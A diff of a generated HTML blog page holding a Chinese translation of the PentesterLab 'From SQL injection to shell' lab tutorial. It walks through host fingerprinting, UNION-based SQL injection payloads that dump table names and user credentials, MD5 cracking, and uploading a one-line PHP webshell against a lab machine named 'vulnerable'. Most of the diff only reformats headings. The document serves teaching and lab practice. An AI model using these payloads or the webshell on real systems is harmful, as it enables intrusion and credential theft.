@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="sql注入, webshell," />
+  <meta name="keywords" content="sql注入 webshell," />
 
 
 
@@ -84,22 +84,19 @@
 
 
 
-<meta name="description" content="#从sql注入到shell上传
-
-序:这篇教程是从pentesterlab看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。">
+<meta name="description" content="从sql注入到shell上传
+这篇教程是从pentesterlab看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="从sql注入到shell上传">
 <meta property="og:url" content="http://yoursite.com/2016/10/15/从sql注入到shell上传/index.html">
 <meta property="og:site_name" content="leohujx">
-<meta property="og:description" content="#从sql注入到shell上传
-
-序:这篇教程是从pentesterlab看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。">
-<meta property="og:updated_time" content="2016-10-15T05:44:15.000Z">
+<meta property="og:description" content="从sql注入到shell上传
+这篇教程是从pentesterlab看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。">
+<meta property="og:updated_time" content="2016-10-15T05:48:26.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="从sql注入到shell上传">
-<meta name="twitter:description" content="#从sql注入到shell上传
-
-序:这篇教程是从pentesterlab看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。">
+<meta name="twitter:description" content="从sql注入到shell上传
+这篇教程是从pentesterlab看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。">
 
 
 
@@ -321,34 +318,31 @@
       
 
       
-        <p>#从sql注入到shell上传</p>
-<blockquote>
-<p>序:<br>这篇教程是从<a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course" target="_blank" rel="external">pentesterlab</a>看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。</p>
+        <h1 id="从sql注入到shell上传"><a href="#从sql注入到shell上传" class="headerlink" title="从sql注入到shell上传"></a>从sql注入到shell上传</h1><blockquote>
+<p>这篇教程是从<a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course" target="_blank" rel="external">pentesterlab</a>看到的，是web渗透入门一个很好的教程，网站上有该课程的靶机实体下载，非会员的话下一个iso格式的靶机，然后安装即可。看完练完以后受益匪浅，所以想翻译成中文以便日后复习之用，有些过于基础的部分就不翻译了。</p>
 </blockquote>
 <a id="more"></a>
-<p>#课程简介<br>这篇课程详细介绍了如何在一个php页面网站上进行sql注入，以及攻击者如何利用sql注入登陆管理员界面。<br><br><br>利用这个突破口，攻击者可以获取网站服务器的命令执行权限。</p>
+<h1 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h1><p>这篇课程详细介绍了如何在一个php页面网站上进行sql注入，以及攻击者如何利用sql注入登陆管理员界面。<br><br><br>利用这个突破口，攻击者可以获取网站服务器的命令执行权限。</p>
 <p>这次攻击主要分为3个部分:</p>
 <ol>
 <li>主机指纹识别：收集该网站的相关信息以及使用的技术。</li>
 <li>发现和利用sql注入：在这个部分，你将会学习到sql注入的工作原理以及如何利用sql注入来挖掘出有用的信息。</li>
 <li>登陆管理员界面以及执行命令：最后一步你将会侵入服务器并获取代码执行权限。</li>
 </ol>
-<p>#主机指纹识别<br>主机指纹识别可以利用不同的工具来完成，比如可以使用浏览器，我们也学能发现这个网站是用php写的[注:网页是以.php结尾的]</p>
-<p>##检查HTTP头部<br>我们可以使用netcat或者telnet来观察头部，可以获取很多信息<br><br><br><figure class="highlight plain"><figcaption><span>telnet vulnerable 80```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">解释:</div><div class="line"></div><div class="line">* vulnerable是主机名或者服务端的ip地址</div><div class="line">* 80端口是网站使用的TCP端口(HTTP默认使用的是80端口)</div><div class="line"></div><div class="line">通过发送以下的HTTP请求:</div></pre></td></tr></table></figure></p>
-<p>GET / HTTP/1.1<br>Host: vulnerable<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过观察服务器给我们返回的头部信息，我们可能能够知道服务器端的PHP版本信息:</div></pre></td></tr></table></figure></p>
-<p>HTTP/1.1 200 OK<br>Date: Thu, 24 Nov 2011 04:40:51 GMT<br>Server: Apache/2.2.16 (Debian)<br>X-Powered-By: PHP/5.3.3-7+squeeze3<br>Vary: Accept-Encoding<br>Content-Length: 1335<br>Content-Type: text/html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">在这该服务端只能够通过HTTP来访问(443端口没有运行任何的东西)，如果该服务只能通过HTTPS，那么telnet和netcat就没用了，此时`openssl `就派上用场了:</div><div class="line">```$ openssl s_client -connect vulnerable:443</div></pre></td></tr></table></figure></p>
+<h1 id="主机指纹识别"><a href="#主机指纹识别" class="headerlink" title="主机指纹识别"></a>主机指纹识别</h1><p>主机指纹识别可以利用不同的工具来完成，比如可以使用浏览器，我们也学能发现这个网站是用php写的[注:网页是以.php结尾的]</p>
+<h2 id="检查HTTP头部"><a href="#检查HTTP头部" class="headerlink" title="检查HTTP头部"></a>检查HTTP头部</h2><p>我们可以使用netcat或者telnet来观察头部，可以获取很多信息<br><br><br><figure class="highlight plain"><figcaption><span>telnet vulnerable 80```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">解释:</div><div class="line"></div><div class="line">* vulnerable是主机名或者服务端的ip地址</div><div class="line">* 80端口是网站使用的TCP端口(HTTP默认使用的是80端口)</div><div class="line"></div><div class="line">通过发送以下的HTTP请求:</div></pre></td></tr></table></figure></p>
+<p>GET / HTTP/1.1<br>Host: vulnerable<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">通过观察服务器给我们返回的头部信息，我们可能能够知道服务器端的PHP版本信息:</div></pre></td></tr></table></figure></p>
+<p>HTTP/1.1 200 OK<br>Date: Thu, 24 Nov 2011 04:40:51 GMT<br>Server: Apache/2.2.16 (Debian)<br>X-Powered-By: PHP/5.3.3-7+squeeze3<br>Vary: Accept-Encoding<br>Content-Length: 1335<br>Content-Type: text/html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">在这该服务端只能够通过HTTP来访问(443端口没有运行任何的东西)，如果该服务只能通过HTTPS，那么telnet和netcat就没用了，此时`openssl `就派上用场了:</div><div class="line">```$ openssl s_client -connect vulnerable:443</div></pre></td></tr></table></figure></p>
 <p>解释:</p>
 <ul>
 <li>vulnerable是主机名或者服务端的ip地址</li>
 <li>443端口是网站使用的TCP端口（HTTPS默认使用的是443端口）</li>
 </ul>
 <p>用比如<a href="http://portswigger.net/" target="_blank" rel="external">burpsuite</a>设本地代理同样可以很轻松的发掘出信息。</p>
-<p>##使用目录挖掘工具<br><a href="http://www.edge-security.com/wfuzz.php" target="_blank" rel="external">wfuzz</a>这个工具可以使用暴力破解来探测该网站存在的目录和页面。</p>
-<p>下面的命令可以来侦测远程主机的目录和页面地址:<br><figure class="highlight plain"><figcaption><span>python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404</span><a href="http://vulnerable/FUZZ```" target="_blank" rel="external">link</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">解释:</div><div class="line"></div><div class="line">   * `-c`: 输出高亮</div><div class="line">   * `-z file,wordlist/general/big.txt`: 告诉wfuzz使用worldlist/general/big.txt字典来暴力破解远程主机的目录名称</div><div class="line">   * `--hc 404`: 告诉wfuzz忽略404页面(不存在)</div><div class="line">   * `http://vulnerable/FUZZ`: 远程主机地址,其中的FUZZ会被字典中的内容替换</div><div class="line"></div><div class="line">当然wufzz也可以来发现网页的php脚本:</div><div class="line">```$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php</div></pre></td></tr></table></figure></p>
-<p>#sql注入的发现和利用</p>
-<p>##sql注入的发现</p>
-<p>###sql介绍<br>略，主要是介绍了select, update, insert, delete这四个命令，它们在网站上比较常用。</p>
-<p>###数字型注入<br>既然错误可以被发现，那么很容易发现web上存在的漏洞。SQL注入可以通过以下这些手段发现。</p>
+<h2 id="使用目录挖掘工具"><a href="#使用目录挖掘工具" class="headerlink" title="使用目录挖掘工具"></a>使用目录挖掘工具</h2><p><a href="http://www.edge-security.com/wfuzz.php" target="_blank" rel="external">wfuzz</a>这个工具可以使用暴力破解来探测该网站存在的目录和页面。</p>
+<p>下面的命令可以来侦测远程主机的目录和页面地址:<br><figure class="highlight plain"><figcaption><span>python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404</span><a href="http://vulnerable/FUZZ```" target="_blank" rel="external">link</a></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">解释:</div><div class="line"></div><div class="line">   * `-c`: 输出高亮</div><div class="line">   * `-z file,wordlist/general/big.txt`: 告诉wfuzz使用worldlist/general/big.txt字典来暴力破解远程主机的目录名称</div><div class="line">   * `--hc 404`: 告诉wfuzz忽略404页面(不存在)</div><div class="line">   * `http://vulnerable/FUZZ`: 远程主机地址,其中的FUZZ会被字典中的内容替换</div><div class="line"></div><div class="line">当然wufzz也可以来发现网页的php脚本:</div><div class="line">```$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php</div></pre></td></tr></table></figure></p>
+<h1 id="sql注入的发现和利用"><a href="#sql注入的发现和利用" class="headerlink" title="sql注入的发现和利用"></a>sql注入的发现和利用</h1><h2 id="sql注入的发现"><a href="#sql注入的发现" class="headerlink" title="sql注入的发现"></a>sql注入的发现</h2><h3 id="sql介绍"><a href="#sql介绍" class="headerlink" title="sql介绍"></a>sql介绍</h3><p>略，主要是介绍了select, update, insert, delete这四个命令，它们在网站上比较常用。</p>
+<h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>既然错误可以被发现，那么很容易发现web上存在的漏洞。SQL注入可以通过以下这些手段发现。</p>
 <blockquote>
 <p>这些手段是通过利用数据库不同的表现来实现的，寻找并利用sql注入是否能成功是依赖很多的因素，虽然它们本身并不是100%可靠的，这就是为什么你需要不断尝试并保持给定的参数是不稳定的</p>
 </blockquote>
@@ -393,12 +387,11 @@
 <p>sql注入不是一门科学，会有很多的因素影响测试的结果。如果你认为某个方法有效，那么你就尝试着找出查询语句是怎么处理你的注入语句，以确保它确实是可注入的。</p>
 </blockquote>
 <p>为了找出sql注入点，你需要在所有该网站下的页面尝试不同的参数方法。一旦你找到了sql注入点，那么我们就可以开始下一节的学习。</p>
-<p>#sql注入的利用</p>
-<p>现在我们在 <a href="http://vulnerable/cat.php" target="_blank" rel="external">http://vulnerable/cat.php</a> 页面找到了一个sql注入点，为了更进一步，我们需要sql注入来挖掘出信息。为了达到这个目的，我们需要去学习下sql中的<code>UNION</code>关键字。</p>
-<p>##UNION关键字<br>UNION关键字用于将两个查询语句的结果一起显示出来。<br><code>SELECT * FROM articles WHERE id=3 UNION SELECT ...</code><br>既然我们是要从其他的表格中挖掘信息，那么这个关键字就可以用来构造注入的语句。查询语句的开头是由php自己产生的，所以我们不可能去更改它。然而我们可以使用UNION关键字来查询其他表格中的信息。</p>
+<h1 id="sql注入的利用"><a href="#sql注入的利用" class="headerlink" title="sql注入的利用"></a>sql注入的利用</h1><p>现在我们在 <a href="http://vulnerable/cat.php" target="_blank" rel="external">http://vulnerable/cat.php</a> 页面找到了一个sql注入点，为了更进一步，我们需要sql注入来挖掘出信息。为了达到这个目的，我们需要去学习下sql中的<code>UNION</code>关键字。</p>
+<h2 id="UNION关键字"><a href="#UNION关键字" class="headerlink" title="UNION关键字"></a>UNION关键字</h2><p>UNION关键字用于将两个查询语句的结果一起显示出来。<br><code>SELECT * FROM articles WHERE id=3 UNION SELECT ...</code><br>既然我们是要从其他的表格中挖掘信息，那么这个关键字就可以用来构造注入的语句。查询语句的开头是由php自己产生的，所以我们不可能去更改它。然而我们可以使用UNION关键字来查询其他表格中的信息。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT id,name,price FROM articles WHERE id=3  </div><div class="line">UNION SELECT id,login,password  FROM users</div></pre></td></tr></table></figure>
 <p>在使用union的时候，最关键的一点就是这两条查询语句的列数一定得相等，要不然就会出错。</p>
-<p>##利用UNION关键字来注入<br>利用UNION关键字来注入的时候得遵循以下的原则:</p>
+<h2 id="利用UNION关键字来注入"><a href="#利用UNION关键字来注入" class="headerlink" title="利用UNION关键字来注入"></a>利用UNION关键字来注入</h2><p>利用UNION关键字来注入的时候得遵循以下的原则:</p>
 <ul>
 <li>找到使用UNION时需要加载的列数</li>
 <li>找到在页面中显示出来的列信息</li>
@@ -427,7 +420,7 @@
 <p><code>Unknown column &#39;10&#39; in &#39;order clause&#39;</code></p>
 <p>这样你就可以用ORDER BY语句，只要逐渐增加使用的数目，直到比如使用了m之后抛出错误，那么说明查询语句中返回的列数就是m-1</p>
 <p>具体步骤:略</p>
-<p>##取得数据<br>现在我们知道了列数，那么就可以开始往外取数据了。通过我们知道的错误信息，发现该网站使用的数据库是MYSQL。<br>使用这个信息，我们可以让数据库替我们执行命令或者返回数据:</p>
+<h2 id="取得数据"><a href="#取得数据" class="headerlink" title="取得数据"></a>取得数据</h2><p>现在我们知道了列数，那么就可以开始往外取数据了。通过我们知道的错误信息，发现该网站使用的数据库是MYSQL。<br>使用这个信息，我们可以让数据库替我们执行命令或者返回数据:</p>
 <ul>
 <li>PHP中连接数据库的用户是<code>current_user()</code></li>
 <li>数据库的版本信息是<code>version()</code></li>
@@ -460,7 +453,7 @@
 </ul>
 <p>不过这里有个问题，它返回的结果是一系列的表格和列名称，但是如果我们要访问特定的数据库，我们得知道哪些列属于哪些表格。幸运的是，information_schema.columns 也同时记录了表格的名称:</p>
 <figure class="highlight plain"><figcaption><span>table_name,column_name FROM information_schema.columns```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">为了拿到数据，我们可以:</div><div class="line"></div><div class="line">* 将表格和列的名称放在不同的地方 `1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns`</div><div class="line">* 使用CONCAT关键字来将表格名称和列的名称连在一起:</div></pre></td></tr></table></figure>
-<p>1 UNION SELECT 1,concat(table_name,’:’, column_name),3,4<br>FROM information_schema.columns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">这样我们就能很清晰的看出table_name和column_name的对应关系了。</div><div class="line"></div><div class="line">我们现在就有了很多的表格和列，第一个表格和列是属于MYSQL的默认表格，在页面源代码的末尾，我们能看到很多表格。</div><div class="line"></div><div class="line">使用上述发掘出来的信息，我们可以从用户表格中取得想要的数据:</div><div class="line">`1 UNION SELECT 1,concat(login,&apos;:&apos;,password),3,4 FROM users;`</div><div class="line"></div><div class="line">这样我们就得了登陆管理员界面的用户名和密码。</div><div class="line"></div><div class="line">#登陆管理员界面并执行命令</div><div class="line">##爆破密码</div><div class="line">在上一步我们得到管理员的用户名密码之后，发现密码是经过md5加密的(有32位)，在这里该文章介绍了使用john工具来对密码进行爆破，我自己是直接找到了一个可以直接md5解密的[网站](http://pmd5.com/)，发现原密码是 P4ssw0rd。</div><div class="line"></div><div class="line">##上传webshell和可执行命令环境</div><div class="line">一旦登陆了管理员界面，下一步就是找到如何登陆服务器并执行命令。</div><div class="line"></div><div class="line">我们发现界面上有个地方是可以上传用户头像的，我们可以尝试着上传一个php的webshell。</div><div class="line">我们可以使用最简单的一个webshell:</div></pre></td></tr></table></figure></p>
+<p>1 UNION SELECT 1,concat(table_name,’:’, column_name),3,4<br>FROM information_schema.columns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">这样我们就能很清晰的看出table_name和column_name的对应关系了。</div><div class="line"></div><div class="line">我们现在就有了很多的表格和列，第一个表格和列是属于MYSQL的默认表格，在页面源代码的末尾，我们能看到很多表格。</div><div class="line"></div><div class="line">使用上述发掘出来的信息，我们可以从用户表格中取得想要的数据:</div><div class="line">`1 UNION SELECT 1,concat(login,&apos;:&apos;,password),3,4 FROM users;`</div><div class="line"></div><div class="line">这样我们就得了登陆管理员界面的用户名和密码。</div><div class="line"></div><div class="line"># 登陆管理员界面并执行命令</div><div class="line">## 爆破密码</div><div class="line">在上一步我们得到管理员的用户名密码之后，发现密码是经过md5加密的(有32位)，在这里该文章介绍了使用john工具来对密码进行爆破，我自己是直接找到了一个可以直接md5解密的[网站](http://pmd5.com/)，发现原密码是 P4ssw0rd。</div><div class="line"></div><div class="line">## 上传webshell和可执行命令环境</div><div class="line">一旦登陆了管理员界面，下一步就是找到如何登陆服务器并执行命令。</div><div class="line"></div><div class="line">我们发现界面上有个地方是可以上传用户头像的，我们可以尝试着上传一个php的webshell。</div><div class="line">我们可以使用最简单的一个webshell:</div></pre></td></tr></table></figure></p>
 <p>&lt;?php<br>  system($_GET[‘cmd’]);<br>?&gt;<br>```</p>
 <p>这个webshell接收get参数并执行相应的系统命令，它需要被存储为php，比如webshell.php这种名称才行。</p>
 <p>我们发现了上传文件的页面: <a href="http://vulnerable/admin/new.php,并尝试着上传脚本。" target="_blank" rel="external">http://vulnerable/admin/new.php,并尝试着上传脚本。</a></p>
@@ -471,7 +464,7 @@
 </ul>
 <p>发现上述方法都是可以的。<br>上传成功以后我们找到上传后的地址，发现是<a href="http://vulnerable/admin/uploads/shell.php3,那么我们构造get参数即可让php脚本执行系统命令" target="_blank" rel="external">http://vulnerable/admin/uploads/shell.php3,那么我们构造get参数即可让php脚本执行系统命令</a>: <a href="http://vulnerable/admin/uploads/shell.php3?cmd=uname" target="_blank" rel="external">http://vulnerable/admin/uploads/shell.php3?cmd=uname</a></p>
 <p>这个脚本缺点在于每次运行脚本都是在一个全新的环境中，并不会有上一个命令执行以后的影响，所以每次执行命令都得重新开始。</p>
-<p>#总结<br>这个例子比较完整的展示了利用sql注入和webshell上传来达到控制服务器的目的，我们可以看出错误提示给了我们很好的提示，让我们能够知道很多的信息，所以一个解决方法就是在PHP设置中把<code>display_errors</code>这个选项给禁止掉，然后重启服务器，这样出现错误的话就不会显示在页面上。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个例子比较完整的展示了利用sql注入和webshell上传来达到控制服务器的目的，我们可以看出错误提示给了我们很好的提示，让我们能够知道很多的信息，所以一个解决方法就是在PHP设置中把<code>display_errors</code>这个选项给禁止掉，然后重启服务器，这样出现错误的话就不会显示在页面上。</p>
 
       
     </div>
@@ -494,7 +487,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/sql注入-webshell/" rel="tag">#sql注入, webshell</a>
+            <a href="/tags/sql注入-webshell/" rel="tag">#sql注入 webshell</a>
           
         </div>
       
@@ -623,7 +616,7 @@
               
             
             
-              <p class="post-toc-empty">此文章未包含目录</p>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#从sql注入到shell上传"><span class="nav-number">1.</span> <span class="nav-text">从sql注入到shell上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#课程简介"><span class="nav-number">2.</span> <span class="nav-text">课程简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#主机指纹识别"><span class="nav-number">3.</span> <span class="nav-text">主机指纹识别</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查HTTP头部"><span class="nav-number">3.1.</span> <span class="nav-text">检查HTTP头部</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用目录挖掘工具"><span class="nav-number">3.2.</span> <span class="nav-text">使用目录挖掘工具</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入的发现和利用"><span class="nav-number">4.</span> <span class="nav-text">sql注入的发现和利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入的发现"><span class="nav-number">4.1.</span> <span class="nav-text">sql注入的发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sql介绍"><span class="nav-number">4.1.1.</span> <span class="nav-text">sql介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数字型注入"><span class="nav-number">4.1.2.</span> <span class="nav-text">数字型注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql注入的利用"><span class="nav-number">5.</span> <span class="nav-text">sql注入的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION关键字"><span class="nav-number">5.1.</span> <span class="nav-text">UNION关键字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用UNION关键字来注入"><span class="nav-number">5.2.</span> <span class="nav-text">利用UNION关键字来注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取得数据"><span class="nav-number">5.3.</span> <span class="nav-text">取得数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
           </div>
         </section>
